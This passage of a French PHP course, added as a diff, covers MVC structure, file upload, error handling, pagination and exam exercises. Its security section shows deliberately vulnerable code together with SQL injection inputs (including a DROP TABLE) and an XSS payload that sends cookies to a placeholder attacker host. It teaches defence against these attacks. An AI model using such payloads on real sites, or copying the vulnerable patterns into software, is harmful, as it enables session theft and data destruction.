+    require_once $fichierControleur;
+    $controleur = new $controleurNom();
+
+    if (method_exists($controleur, $action)) {
+        $controleur->$action($parametre);
+    } else {
+        http_response_code(404);
+        echo "Action non trouvee";
+    }
+} else {
+    http_response_code(404);
+    echo "Page non trouvee";
+}
+```
+
+### 12.4 Modele
+
+```php
+<?php
+// src/Models/Produit.php
+class Produit {
+    private PDO $pdo;
+
+    public function __construct() {
+        $this->pdo = Database::getInstance();
+    }
+
+    public function findAll(): array {
+        $stmt = $this->pdo->prepare("SELECT * FROM produits WHERE actif = 1 ORDER BY nom");
+        $stmt->execute();
+        return $stmt->fetchAll();
+    }
+
+    public function findById(int $id): array|false {
+        $stmt = $this->pdo->prepare("SELECT * FROM produits WHERE id = :id");
+        $stmt->execute([':id' => $id]);
+        return $stmt->fetch();
+    }
+
+    public function findByCategorie(string $categorie): array {
+        $stmt = $this->pdo->prepare("SELECT * FROM produits WHERE categorie = :cat AND actif = 1");
+        $stmt->execute([':cat' => $categorie]);
+        return $stmt->fetchAll();
+    }
+
+    public function search(string $motcle): array {
+        $stmt = $this->pdo->prepare("
+            SELECT * FROM produits
+            WHERE (nom LIKE :q OR description LIKE :q)
+            AND actif = 1
+        ");
+        $stmt->execute([':q' => '%' . $motcle . '%']);
+        return $stmt->fetchAll();
+    }
+
+    public function create(array $data): int {
+        $stmt = $this->pdo->prepare("
+            INSERT INTO produits (nom, description, prix, stock, categorie)
+            VALUES (:nom, :description, :prix, :stock, :categorie)
+        ");
+        $stmt->execute([
+            ':nom' => $data['nom'],
+            ':description' => $data['description'] ?? '',
+            ':prix' => $data['prix'],
+            ':stock' => $data['stock'] ?? 0,
+            ':categorie' => $data['categorie'] ?? null,
+        ]);
+        return (int) $this->pdo->lastInsertId();
+    }
+
+    public function update(int $id, array $data): bool {
+        $stmt = $this->pdo->prepare("
+            UPDATE produits
+            SET nom = :nom, description = :description, prix = :prix,
+                stock = :stock, categorie = :categorie
+            WHERE id = :id
+        ");
+        return $stmt->execute([
+            ':nom' => $data['nom'],
+            ':description' => $data['description'] ?? '',
+            ':prix' => $data['prix'],
+            ':stock' => $data['stock'] ?? 0,
+            ':categorie' => $data['categorie'] ?? null,
+            ':id' => $id,
+        ]);
+    }
+
+    public function delete(int $id): bool {
+        $stmt = $this->pdo->prepare("UPDATE produits SET actif = 0 WHERE id = :id");
+        return $stmt->execute([':id' => $id]);
+    }
+
+    public function count(): int {
+        $stmt = $this->pdo->prepare("SELECT COUNT(*) FROM produits WHERE actif = 1");
+        $stmt->execute();
+        return (int) $stmt->fetchColumn();
+    }
+}
+```
+
+### 12.5 Controleur
+
+```php
+<?php
+// src/Controllers/ProduitController.php
+class ProduitController {
+    private Produit $model;
+
+    public function __construct() {
+        $this->model = new Produit();
+    }
+
+    public function index(): void {
+        $produits = $this->model->findAll();
+        $titre = "Liste des produits";
+        require __DIR__ . '/../Views/produits/index.php';
+    }
+
+    public function show(?string $id): void {
+        if ($id === null) {
+            header("Location: /produit");
+            exit;
+        }
+
+        $produit = $this->model->findById((int) $id);
+
+        if ($produit === false) {
+            http_response_code(404);
+            echo "Produit non trouve";
+            return;
+        }
+
+        $titre = $produit['nom'];
+        require __DIR__ . '/../Views/produits/show.php';
+    }
+
+    public function create(): void {
+        $erreurs = [];
+        $data = [];
+
+        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+            $data = [
+                'nom' => trim($_POST['nom'] ?? ''),
+                'description' => trim($_POST['description'] ?? ''),
+                'prix' => (float) ($_POST['prix'] ?? 0),
+                'stock' => (int) ($_POST['stock'] ?? 0),
+                'categorie' => trim($_POST['categorie'] ?? ''),
+            ];
+
+            // Validation
+            if (empty($data['nom'])) {
+                $erreurs[] = "Le nom est obligatoire";
+            }
+            if ($data['prix'] <= 0) {
+                $erreurs[] = "Le prix doit etre positif";
+            }
+            if ($data['stock'] < 0) {
+                $erreurs[] = "Le stock ne peut pas etre negatif";
+            }
+
+            if (empty($erreurs)) {
+                $id = $this->model->create($data);
+                header("Location: /produit/show/$id");
+                exit;
+            }
+        }
+
+        $titre = "Ajouter un produit";
+        require __DIR__ . '/../Views/produits/create.php';
+    }
+
+    public function edit(?string $id): void {
+        if ($id === null) {
+            header("Location: /produit");
+            exit;
+        }
+
+        $produit = $this->model->findById((int) $id);
+
+        if ($produit === false) {
+            http_response_code(404);
+            echo "Produit non trouve";
+            return;
+        }
+
+        $erreurs = [];
+
+        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+            $data = [
+                'nom' => trim($_POST['nom'] ?? ''),
+                'description' => trim($_POST['description'] ?? ''),
+                'prix' => (float) ($_POST['prix'] ?? 0),
+                'stock' => (int) ($_POST['stock'] ?? 0),
+                'categorie' => trim($_POST['categorie'] ?? ''),
+            ];
+
+            if (empty($data['nom'])) {
+                $erreurs[] = "Le nom est obligatoire";
+            }
+            if ($data['prix'] <= 0) {
+                $erreurs[] = "Le prix doit etre positif";
+            }
+
+            if (empty($erreurs)) {
+                $this->model->update((int) $id, $data);
+                header("Location: /produit/show/$id");
+                exit;
+            }
+
+            $produit = array_merge($produit, $data);
+        }
+
+        $titre = "Modifier : " . $produit['nom'];
+        require __DIR__ . '/../Views/produits/edit.php';
+    }
+
+    public function delete(?string $id): void {
+        if ($id !== null && $_SERVER['REQUEST_METHOD'] === 'POST') {
+            $this->model->delete((int) $id);
+        }
+        header("Location: /produit");
+        exit;
+    }
+}
+```
+
+### 12.6 Vues
+
+```php
+<?php
+// src/Views/layout.php
+?>
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title><?= htmlspecialchars($titre ?? 'Mon application') ?></title>
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+    <nav>
+        <a href="/produit">Produits</a>
+        <a href="/produit/create">Ajouter</a>
+    </nav>
+    <main>
+        <?= $contenu ?>
+    </main>
+</body>
+</html>
+```
+
+```php
+<?php
+// src/Views/produits/index.php
+?>
+<h1>Produits</h1>
+<table>
+    <thead>
+        <tr>
+            <th>Nom</th>
+            <th>Prix</th>
+            <th>Stock</th>
+            <th>Actions</th>
+        </tr>
+    </thead>
+    <tbody>
+        <?php foreach ($produits as $p): ?>
+        <tr>
+            <td><a href="/produit/show/<?= $p['id'] ?>"><?= htmlspecialchars($p['nom']) ?></a></td>
+            <td><?= number_format($p['prix'], 2, ',', ' ') ?> EUR</td>
+            <td><?= $p['stock'] ?></td>
+            <td>
+                <a href="/produit/edit/<?= $p['id'] ?>">Modifier</a>
+                <form method="POST" action="/produit/delete/<?= $p['id'] ?>" style="display:inline;">
+                    <button onclick="return confirm('Confirmer ?')">Supprimer</button>
+                </form>
+            </td>
+        </tr>
+        <?php endforeach; ?>
+    </tbody>
+</table>
+```
+
+---
+
+## 13. Upload de fichiers
+
+### 13.1 Formulaire HTML
+
+Le formulaire doit avoir l'attribut `enctype="multipart/form-data"` et utiliser la methode POST.
+
+```html
+<form method="POST" action="upload.php" enctype="multipart/form-data">
+    <label for="photo">Photo :</label>
+    <input type="file" id="photo" name="photo" accept="image/*" required>
+    <button type="submit">Envoyer</button>
+</form>
+```
+
+### 13.2 Traitement PHP
+
+```php
+<?php
+// upload.php
+$dossierUpload = __DIR__ . '/uploads/';
+$erreur = '';
+$succes = '';
+
+// Creer le dossier s'il n'existe pas
+if (!is_dir($dossierUpload)) {
+    mkdir($dossierUpload, 0755, true);
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Verifier qu'un fichier a ete envoye
+    if (!isset($_FILES['photo']) || $_FILES['photo']['error'] !== UPLOAD_ERR_OK) {
+        $erreur = match ($_FILES['photo']['error'] ?? -1) {
+            UPLOAD_ERR_INI_SIZE   => "Fichier trop volumineux (limite php.ini)",
+            UPLOAD_ERR_FORM_SIZE  => "Fichier trop volumineux (limite formulaire)",
+            UPLOAD_ERR_PARTIAL    => "Fichier partiellement telecharge",
+            UPLOAD_ERR_NO_FILE    => "Aucun fichier envoye",
+            UPLOAD_ERR_NO_TMP_DIR => "Dossier temporaire manquant",
+            UPLOAD_ERR_CANT_WRITE => "Echec d'ecriture sur le disque",
+            default               => "Erreur inconnue",
+        };
+    } else {
+        $fichier = $_FILES['photo'];
+
+        // Validation du type MIME
+        $typesAutorises = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
+        $finfo = new finfo(FILEINFO_MIME_TYPE);
+        $typeMime = $finfo->file($fichier['tmp_name']);
+
+        if (!in_array($typeMime, $typesAutorises, true)) {
+            $erreur = "Type de fichier non autorise. Types acceptes : JPEG, PNG, GIF, WEBP";
+        }
+
+        // Validation de la taille (5 Mo max)
+        $tailleMax = 5 * 1024 * 1024;
+        if (empty($erreur) && $fichier['size'] > $tailleMax) {
+            $erreur = "Le fichier depasse la taille maximale de 5 Mo";
+        }
+
+        // Validation de l'extension
+        $extensionsAutorisees = ['jpg', 'jpeg', 'png', 'gif', 'webp'];
+        $extension = strtolower(pathinfo($fichier['name'], PATHINFO_EXTENSION));
+        if (empty($erreur) && !in_array($extension, $extensionsAutorisees, true)) {
+            $erreur = "Extension non autorisee";
+        }
+
+        // Deplacement du fichier
+        if (empty($erreur)) {
+            // Generer un nom unique (ne jamais utiliser le nom original)
+            $nomFichier = uniqid('img_', true) . '.' . $extension;
+            $cheminDestination = $dossierUpload . $nomFichier;
+
+            if (move_uploaded_file($fichier['tmp_name'], $cheminDestination)) {
+                $succes = "Fichier uploade : $nomFichier";
+            } else {
+                $erreur = "Echec du deplacement du fichier";
+            }
+        }
+    }
+}
+```
+
+Points de securite pour l'upload :
+- Ne jamais faire confiance au nom original du fichier
+- Toujours generer un nom unique (uniqid, random_bytes)
+- Verifier le type MIME reel avec `finfo`, pas avec `$_FILES['type']` (falsifiable)
+- Limiter les extensions et les types
+- Stocker les fichiers en dehors du dossier web si possible
+- Limiter la taille
+
+---
+
+## 14. Gestion des erreurs
+
+### 14.1 Configuration du rapport d'erreurs
+
+```php
+<?php
+// En developpement
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+// En production
+ini_set('display_errors', 0);
+ini_set('log_errors', 1);
+ini_set('error_log', '/var/log/php/errors.log');
+error_reporting(E_ALL);
+```
+
+Niveaux d'erreurs :
+
+| Constante | Description |
+|-----------|-------------|
+| `E_ERROR` | Erreur fatale |
+| `E_WARNING` | Avertissement |
+| `E_NOTICE` | Notification |
+| `E_PARSE` | Erreur de syntaxe |
+| `E_DEPRECATED` | Fonctionnalite obsolete |
+| `E_ALL` | Toutes les erreurs |
+
+### 14.2 try / catch / finally
+
+```php
+<?php
+try {
+    $pdo = new PDO($dsn, $user, $password);
+    $stmt = $pdo->prepare("SELECT * FROM table_inexistante");
+    $stmt->execute();
+} catch (PDOException $e) {
+    echo "Erreur base de donnees : " . $e->getMessage();
+    // $e->getCode()    -- code d'erreur
+    // $e->getFile()    -- fichier
+    // $e->getLine()    -- ligne
+    // $e->getTrace()   -- pile d'appels
+} catch (Exception $e) {
+    echo "Erreur generale : " . $e->getMessage();
+} finally {
+    // Execute toujours, avec ou sans exception
+    echo "Nettoyage effectue";
+}
+```
+
+### 14.3 Exceptions personnalisees
+
+```php
+<?php
+class AppException extends Exception {}
+
+class ValidationException extends AppException {
+    private array $erreurs;
+
+    public function __construct(array $erreurs, int $code = 0, ?Throwable $previous = null) {
+        $this->erreurs = $erreurs;
+        parent::__construct("Erreurs de validation", $code, $previous);
+    }
+
+    public function getErreurs(): array {
+        return $this->erreurs;
+    }
+}
+
+class NotFoundException extends AppException {
+    public function __construct(string $entite, int|string $id) {
+        parent::__construct("$entite #$id non trouve(e)");
+    }
+}
+
+// Utilisation
+function trouverProduit(int $id): array {
+    $pdo = Database::getInstance();
+    $stmt = $pdo->prepare("SELECT * FROM produits WHERE id = :id");
+    $stmt->execute([':id' => $id]);
+    $produit = $stmt->fetch();
+
+    if ($produit === false) {
+        throw new NotFoundException('Produit', $id);
+    }
+
+    return $produit;
+}
+
+function validerProduit(array $data): void {
+    $erreurs = [];
+
+    if (empty($data['nom'])) {
+        $erreurs[] = "Le nom est obligatoire";
+    }
+    if (($data['prix'] ?? 0) <= 0) {
+        $erreurs[] = "Le prix doit etre positif";
+    }
+
+    if (!empty($erreurs)) {
+        throw new ValidationException($erreurs);
+    }
+}
+
+// Gestion
+try {
+    $produit = trouverProduit(999);
+} catch (NotFoundException $e) {
+    http_response_code(404);
+    echo $e->getMessage();
+} catch (ValidationException $e) {
+    http_response_code(422);
+    foreach ($e->getErreurs() as $erreur) {
+        echo "- $erreur<br>";
+    }
+} catch (AppException $e) {
+    http_response_code(500);
+    echo "Erreur application : " . $e->getMessage();
+}
+```
+
+### 14.4 Gestionnaire d'exceptions global
+
+```php
+<?php
+set_exception_handler(function (Throwable $e): void {
+    error_log($e->getMessage() . " dans " . $e->getFile() . ":" . $e->getLine());
+
+    http_response_code(500);
+    echo "Une erreur interne est survenue.";
+});
+
+set_error_handler(function (int $severity, string $message, string $file, int $line): bool {
+    throw new ErrorException($message, 0, $severity, $file, $line);
+});
+```
+
+---
+
+## 15. Securite
+
+### 15.1 Injection SQL
+
+L'injection SQL consiste a inserer du code SQL malveillant dans une requete via des donnees utilisateur non filtrees.
+
+**Code vulnerable (a ne JAMAIS faire) :**
+
+```php
+<?php
+// DANGEREUX - Injection SQL possible
+$id = $_GET['id'];
+$resultat = $pdo->query("SELECT * FROM utilisateurs WHERE id = $id");
+
+// Si l'utilisateur envoie : id=1 OR 1=1
+// La requete devient : SELECT * FROM utilisateurs WHERE id = 1 OR 1=1
+// -> Retourne TOUS les utilisateurs
+
+// Pire : id=1; DROP TABLE utilisateurs; --
+```
+
+**Code securise (requetes preparees) :**
+
+```php
+<?php
+// SECURISE - Requete preparee
+$stmt = $pdo->prepare("SELECT * FROM utilisateurs WHERE id = :id");
+$stmt->execute([':id' => $_GET['id']]);
+$utilisateur = $stmt->fetch();
+
+// PDO echappe automatiquement les valeurs
+// L'injection est impossible car la structure de la requete est figee
+```
+
+Regle absolue : **utiliser TOUJOURS des requetes preparees pour toute donnee provenant de l'exterieur**.
+
+### 15.2 Cross-Site Scripting (XSS)
+
+Le XSS consiste a injecter du code JavaScript malveillant dans une page web, execute par le navigateur des autres utilisateurs.
+
+**Code vulnerable :**
+
+```php
+<?php
+// DANGEREUX - XSS possible
+echo "Bonjour " . $_GET['nom'];
+
+// Si l'utilisateur envoie : nom=<script>document.location='https://pirate.com/vol?cookie='+document.cookie</script>
+// Le script s'execute dans le navigateur de la victime
+```
+
+**Code securise :**
+
+```php
+<?php
+// SECURISE - Echappement HTML
+echo "Bonjour " . htmlspecialchars($_GET['nom'], ENT_QUOTES, 'UTF-8');
+
+// Les balises HTML sont converties en entites inoffensives
+// <script> devient &lt;script&gt;
+```
+
+Regle : **echapper avec htmlspecialchars() toute donnee affichee dans le HTML**.
+
+### 15.3 Cross-Site Request Forgery (CSRF)
+
+Le CSRF exploite la session active d'un utilisateur pour lui faire effectuer des actions a son insu.
+
+**Protection par token :**
+
+```php
+<?php
+// Generer un token CSRF
+session_start();
+
+function genererTokenCSRF(): string {
+    if (empty($_SESSION['csrf_token'])) {
+        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+    }
+    return $_SESSION['csrf_token'];
+}
+
+function verifierTokenCSRF(string $token): bool {
+    return isset($_SESSION['csrf_token']) && hash_equals($_SESSION['csrf_token'], $token);
+}
+```
+
+```php
+<!-- Dans le formulaire -->
+<form method="POST" action="traitement.php">
+    <input type="hidden" name="csrf_token" value="<?= genererTokenCSRF() ?>">
+    <!-- Autres champs -->
+    <button type="submit">Envoyer</button>
+</form>
+```
+
+```php
+<?php
+// Verification dans le traitement
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $token = $_POST['csrf_token'] ?? '';
+
+    if (!verifierTokenCSRF($token)) {
+        http_response_code(403);
+        die("Token CSRF invalide - requete rejetee");
+    }
+
+    // Traitement normal...
+
+    // Regenerer le token apres utilisation
+    unset($_SESSION['csrf_token']);
+}
+```
+
+### 15.4 Hachage de mots de passe
+
+Ne **jamais** stocker un mot de passe en clair dans la base de donnees. Utiliser `password_hash()` et `password_verify()`.
+
+```php
+<?php
+// INSCRIPTION : hacher le mot de passe
+$motdepasse = $_POST['motdepasse'];
+$hash = password_hash($motdepasse, PASSWORD_DEFAULT);
+// Produit un hash du type : $2y$10$abcdefghij...
+
+// Stocker $hash en base de donnees
+$stmt = $pdo->prepare("INSERT INTO utilisateurs (email, mot_de_passe) VALUES (:email, :hash)");
+$stmt->execute([
+    ':email' => $email,
+    ':hash' => $hash
+]);
+```
+
+```php
+<?php
+// CONNEXION : verifier le mot de passe
+$stmt = $pdo->prepare("SELECT * FROM utilisateurs WHERE email = :email");
+$stmt->execute([':email' => $_POST['email']]);
+$utilisateur = $stmt->fetch();
+
+if ($utilisateur && password_verify($_POST['motdepasse'], $utilisateur['mot_de_passe'])) {
+    // Mot de passe correct
+    $_SESSION['user_id'] = $utilisateur['id'];
+
+    // Verifier si le hash doit etre mis a jour
+    if (password_needs_rehash($utilisateur['mot_de_passe'], PASSWORD_DEFAULT)) {
+        $nouveauHash = password_hash($_POST['motdepasse'], PASSWORD_DEFAULT);
+        $stmt = $pdo->prepare("UPDATE utilisateurs SET mot_de_passe = :hash WHERE id = :id");
+        $stmt->execute([':hash' => $nouveauHash, ':id' => $utilisateur['id']]);
+    }
+} else {
+    // Identifiants incorrects
+    // NE PAS preciser si c'est l'email ou le mot de passe qui est faux
+    $erreur = "Identifiants incorrects";
+}
+```
+
+`PASSWORD_DEFAULT` utilise actuellement bcrypt. PHP adaptera l'algorithme dans les futures versions, d'ou l'interet de `password_needs_rehash()`.
+
+### 15.5 Resume des bonnes pratiques de securite
+
+| Menace | Protection |
+|--------|-----------|
+| Injection SQL | Requetes preparees (PDO) |
+| XSS | htmlspecialchars() sur tout affichage |
+| CSRF | Token aleatoire dans les formulaires |
+| Mots de passe | password_hash() / password_verify() |
+| Sessions | session_regenerate_id(), cookie httponly+secure+samesite |
+| Uploads | Verifier type MIME reel, renommer le fichier, limiter la taille |
+| Donnees utilisateur | Valider et sanitizer toute entree |
+
+---
+
+## 16. Include et require
+
+### 16.1 Difference entre include et require
+
+| Instruction | Fichier absent | Effet |
+|-------------|---------------|-------|
+| `include` | Warning (E_WARNING) | Le script continue |
+| `require` | Erreur fatale (E_ERROR) | Le script s'arrete |
+| `include_once` | Warning si absent | Inclut une seule fois (ignore les doublons) |
+| `require_once` | Erreur fatale si absent | Inclut une seule fois (ignore les doublons) |
+
+Regle pratique :
+- `require_once` pour les fichiers indispensables (classes, configuration, fonctions)
+- `include` pour les fichiers facultatifs (widgets, blocs optionnels)
+
+### 16.2 Organisation du code avec include
+
+```
+projet/
+  public/
+    index.php
+  includes/
+    header.php
+    footer.php
+    nav.php
+  config/
+    database.php
+    constants.php
+```
+
+```php
+<?php
+// config/constants.php
+define('SITE_NOM', 'MonSite');
+define('SITE_URL', 'http://localhost');
+define('RACINE', dirname(__DIR__));
+```
+
+```php
+<?php
+// includes/header.php
+?>
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title><?= htmlspecialchars($titre ?? SITE_NOM) ?></title>
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+    <?php include __DIR__ . '/nav.php'; ?>
+    <main>
+```
+
+```php
+<?php
+// includes/footer.php
+?>
+    </main>
+    <footer>
+        <p><?= SITE_NOM ?> - <?= date('Y') ?></p>
+    </footer>
+</body>
+</html>
+```
+
+```php
+<?php
+// public/index.php
+require_once __DIR__ . '/../config/constants.php';
+require_once __DIR__ . '/../config/database.php';
+
+$titre = "Accueil";
+
+include __DIR__ . '/../includes/header.php';
+?>
+
+<h1>Bienvenue</h1>
+<p>Contenu de la page d'accueil.</p>
+
+<?php include __DIR__ . '/../includes/footer.php'; ?>
+```
+
+### 16.3 Autoload (rappel)
+
+L'autoload remplace les dizaines de `require` pour les classes :
+
+```php
+<?php
+// src/autoload.php
+spl_autoload_register(function (string $classe): void {
+    $fichier = __DIR__ . '/' . str_replace('\\', '/', $classe) . '.php';
+    if (file_exists($fichier)) {
+        require_once $fichier;
+    }
+});
+```
+
+---
+
+## 17. Pagination des resultats
+
+### 17.1 Principe
+
+La pagination consiste a diviser un grand nombre de resultats en pages de taille fixe. On calcule :
+- Le nombre total d'elements
+- Le nombre de pages = ceil(total / elements_par_page)
+- L'offset SQL = (page_courante - 1) * elements_par_page
+
+### 17.2 Implementation complete
+
+```php
+<?php
+// pagination.php
+require_once 'Database.php';
+
+$pdo = Database::getInstance();
+
+// Parametres
+$parPage = 10;
+$pageCourante = max(1, (int) ($_GET['page'] ?? 1));
+
+// Compter le total
+$stmt = $pdo->prepare("SELECT COUNT(*) FROM produits WHERE actif = 1");
+$stmt->execute();
+$total = (int) $stmt->fetchColumn();
+
+// Calculer le nombre de pages
+$nombrePages = (int) ceil($total / $parPage);
+
+// Securiser la page courante
+if ($pageCourante > $nombrePages && $nombrePages > 0) {
+    $pageCourante = $nombrePages;
+}
+
+// Calculer l'offset
+$offset = ($pageCourante - 1) * $parPage;
+
+// Requete avec LIMIT et OFFSET
+$stmt = $pdo->prepare("
+    SELECT * FROM produits
+    WHERE actif = 1
+    ORDER BY nom
+    LIMIT :limit OFFSET :offset
+");
+$stmt->bindValue(':limit', $parPage, PDO::PARAM_INT);
+$stmt->bindValue(':offset', $offset, PDO::PARAM_INT);
+$stmt->execute();
+$produits = $stmt->fetchAll();
+?>
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Produits - Page <?= $pageCourante ?></title>
+    <style>
+        .pagination { display: flex; gap: 5px; list-style: none; padding: 0; }
+        .pagination a { padding: 5px 10px; border: 1px solid #ccc; text-decoration: none; }
+        .pagination .active a { background: #333; color: #fff; }
+    </style>
+</head>
+<body>
+    <h1>Produits (<?= $total ?> resultats)</h1>
+
+    <table border="1" cellpadding="5">
+        <thead>
+            <tr><th>ID</th><th>Nom</th><th>Prix</th><th>Stock</th></tr>
+        </thead>
+        <tbody>
+            <?php foreach ($produits as $p): ?>
+            <tr>
+                <td><?= $p['id'] ?></td>
+                <td><?= htmlspecialchars($p['nom']) ?></td>
+                <td><?= number_format($p['prix'], 2, ',', ' ') ?> EUR</td>
+                <td><?= $p['stock'] ?></td>
+            </tr>
+            <?php endforeach; ?>
+        </tbody>
+    </table>
+
+    <?php if ($nombrePages > 1): ?>
+    <nav>
+        <ul class="pagination">
+            <?php if ($pageCourante > 1): ?>
+                <li><a href="?page=1">Debut</a></li>
+                <li><a href="?page=<?= $pageCourante - 1 ?>">Precedent</a></li>
+            <?php endif; ?>
+
+            <?php
+            // Afficher les numeros de page autour de la page courante
+            $debut = max(1, $pageCourante - 2);
+            $fin = min($nombrePages, $pageCourante + 2);
+
+            for ($i = $debut; $i <= $fin; $i++):
+            ?>
+                <li class="<?= $i === $pageCourante ? 'active' : '' ?>">
+                    <a href="?page=<?= $i ?>"><?= $i ?></a>
+                </li>
+            <?php endfor; ?>
+
+            <?php if ($pageCourante < $nombrePages): ?>
+                <li><a href="?page=<?= $pageCourante + 1 ?>">Suivant</a></li>
+                <li><a href="?page=<?= $nombrePages ?>">Fin</a></li>
+            <?php endif; ?>
+        </ul>
+    </nav>
+    <?php endif; ?>
+
+    <p>Page <?= $pageCourante ?> sur <?= $nombrePages ?></p>
+</body>
+</html>
+```
+
+### 17.3 Fonction de pagination reutilisable
+
+```php
+<?php
+function paginer(PDO $pdo, string $requete, array $params, int $parPage, int $page): array {
+    // Compter le total
+    $requeteCount = preg_replace('/SELECT .+ FROM/i', 'SELECT COUNT(*) FROM', $requete);
+    $requeteCount = preg_replace('/ORDER BY .+$/i', '', $requeteCount);
+
+    $stmtCount = $pdo->prepare($requeteCount);
+    $stmtCount->execute($params);
+    $total = (int) $stmtCount->fetchColumn();
+
+    $nombrePages = (int) ceil($total / $parPage);
+    $page = max(1, min($page, $nombrePages));
+    $offset = ($page - 1) * $parPage;
+
+    // Requete paginee
+    $requetePaginee = $requete . " LIMIT $parPage OFFSET $offset";
+    $stmt = $pdo->prepare($requetePaginee);
+    $stmt->execute($params);
+    $resultats = $stmt->fetchAll();
+
+    return [
+        'donnees' => $resultats,
+        'total' => $total,
+        'par_page' => $parPage,
+        'page_courante' => $page,
+        'nombre_pages' => $nombrePages,
+    ];
+}
+
+// Utilisation
+$pagination = paginer(
+    $pdo,
+    "SELECT * FROM produits WHERE categorie = :cat ORDER BY nom",
+    [':cat' => 'informatique'],
+    10,
+    (int) ($_GET['page'] ?? 1)
+);
+
+$produits = $pagination['donnees'];
+$nombrePages = $pagination['nombre_pages'];
+$pageCourante = $pagination['page_courante'];
+```
+
+---
+
+## 18. Exercices d'examen corriges
+
+### Exercice 1 -- Variables et types
+
+**Enonce :** Ecrire un script PHP qui demande le nom, le prenom et l'age d'un utilisateur via un formulaire, puis affiche un message de bienvenue indiquant s'il est majeur ou mineur. Afficher egalement son annee de naissance approximative.
+
+**Solution :**
+
+```php
+<?php
+$nom = '';
+$prenom = '';
+$age = '';
+$message = '';
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $nom = htmlspecialchars(trim($_POST['nom'] ?? ''));
+    $prenom = htmlspecialchars(trim($_POST['prenom'] ?? ''));
+    $age = (int) ($_POST['age'] ?? 0);
+
+    if (!empty($nom) && !empty($prenom) && $age > 0 && $age < 150) {
+        $statut = ($age >= 18) ? "majeur(e)" : "mineur(e)";
+        $anneeNaissance = date('Y') - $age;
+        $message = "Bonjour $prenom $nom, vous avez $age ans, "
+                 . "vous etes $statut. "
+                 . "Vous etes ne(e) approximativement en $anneeNaissance.";
+    } else {
+        $message = "Veuillez remplir correctement tous les champs.";
+    }
+}
+?>
+<!DOCTYPE html>
+<html lang="fr">
+<head><meta charset="UTF-8"><title>Exercice 1</title></head>
+<body>
+    <?php if ($message): ?>
+        <p><strong><?= $message ?></strong></p>
+    <?php endif; ?>
+    <form method="POST">
+        <label>Nom : <input type="text" name="nom" value="<?= $nom ?>" required></label><br>
+        <label>Prenom : <input type="text" name="prenom" value="<?= $prenom ?>" required></label><br>
+        <label>Age : <input type="number" name="age" min="1" max="150" value="<?= $age ?>" required></label><br>
+        <button type="submit">Valider</button>
+    </form>
+</body>
+</html>
+```
+
+---
+
+### Exercice 2 -- Structures de controle et tableaux
+
+**Enonce :** Ecrire un script PHP qui genere la table de multiplication d'un nombre saisi par l'utilisateur (de 1 a 10). Stocker les resultats dans un tableau associatif avant de les afficher dans un tableau HTML.
+
+**Solution :**
+
+```php
+<?php
+$nombre = 0;
+$table = [];
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $nombre = (int) ($_POST['nombre'] ?? 0);
+
+    if ($nombre >= 1 && $nombre <= 100) {
+        for ($i = 1; $i <= 10; $i++) {
+            $table["$nombre x $i"] = $nombre * $i;
+        }
+    }
+}
+?>
+<!DOCTYPE html>
+<html lang="fr">
+<head><meta charset="UTF-8"><title>Table de multiplication</title></head>
+<body>
+    <form method="POST">
+        <label>Nombre : <input type="number" name="nombre" min="1" max="100"
+               value="<?= $nombre ?>" required></label>
+        <button type="submit">Generer</button>
+    </form>
+
+    <?php if (!empty($table)): ?>
+    <h2>Table de <?= $nombre ?></h2>
+    <table border="1" cellpadding="5">
+        <thead><tr><th>Operation</th><th>Resultat</th></tr></thead>
+        <tbody>
+            <?php foreach ($table as $operation => $resultat): ?>
+            <tr>
+                <td><?= htmlspecialchars($operation) ?></td>
+                <td><?= $resultat ?></td>
+            </tr>
+            <?php endforeach; ?>
+        </tbody>
+    </table>
+    <?php endif; ?>
+</body>
+</html>
+```
+
+---
+
+### Exercice 3 -- Fonctions et chaines de caracteres
+
+**Enonce :** Ecrire les fonctions suivantes :
+1. `compterMots(string $texte): int` -- compte le nombre de mots
+2. `inverserMots(string $texte): string` -- inverse l'ordre des mots
+3. `censurerMot(string $texte, string $mot): string` -- remplace un mot par des etoiles
+
+**Solution :**
+
+```php
+<?php
+function compterMots(string $texte): int {
+    $texte = trim($texte);
+    if (empty($texte)) {
+        return 0;
+    }
+    $mots = preg_split('/\s+/', $texte);
+    return count($mots);
+}
+
+function inverserMots(string $texte): string {
+    $mots = explode(' ', trim($texte));
+    $mots = array_reverse($mots);
+    return implode(' ', $mots);
+}
+
+function censurerMot(string $texte, string $mot): string {
+    $remplacement = str_repeat('*', strlen($mot));
+    return str_ireplace($mot, $remplacement, $texte);
+}
+
+// Tests
+$phrase = "Le PHP est un langage de programmation";
+
+echo compterMots($phrase) . "\n";           // 7
+echo inverserMots($phrase) . "\n";          // programmation de langage un est PHP Le
+echo censurerMot($phrase, "PHP") . "\n";    // Le *** est un langage de programmation
+echo censurerMot($phrase, "langage") . "\n"; // Le PHP est un ******* de programmation
+```
+
+---
+
+### Exercice 4 -- Formulaire avec validation complete
+
+**Enonce :** Creer un formulaire de contact avec les champs : nom (obligatoire, 2-50 caracteres), email (obligatoire, format valide), sujet (obligatoire, liste deroulante), message (obligatoire, 10-1000 caracteres). Valider toutes les donnees et afficher les erreurs. En cas de succes, afficher un recapitulatif.
+
+**Solution :**
+
+```php
+<?php
+$erreurs = [];
+$succes = false;
+$data = [
+    'nom' => '',
+    'email' => '',
+    'sujet' => '',
+    'message' => ''
+];
+
+$sujets = [
+    'info' => 'Demande d\'information',
+    'support' => 'Support technique',
+    'devis' => 'Demande de devis',
+    'autre' => 'Autre'
+];
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
